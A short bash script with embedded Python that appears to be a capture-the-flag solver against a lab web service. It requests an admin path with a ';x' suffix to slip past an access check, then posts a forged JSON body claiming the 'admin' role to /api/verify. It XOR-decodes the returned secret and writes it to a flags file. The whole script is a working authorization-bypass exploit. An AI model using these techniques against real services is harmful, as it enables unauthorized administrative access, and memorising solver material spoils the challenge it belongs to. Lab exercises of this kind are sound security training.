#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import json, struct, sys
from urllib.request import Request, urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

resp1 = urlopen(base + "/admin/staff/gate-07;x", timeout=5)
data1 = json.loads(resp1.read())
assert data1.get("next") == "/api/verify"

body = json.dumps({"level": False, "role": "admin"}).encode()
req = Request(base + "/api/verify", data=body,
              headers={"Content-Type": "application/json"}, method="POST")
resp2 = urlopen(req, timeout=5)
data = resp2.read()

magic = data[:5]
if magic != b"\x7fGATE":
    raise SystemExit(f"bad magic: {magic!r}")
key_len = struct.unpack("B", data[5:6])[0]
key = data[6:6 + key_len]
encrypted = data[6 + key_len:]
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
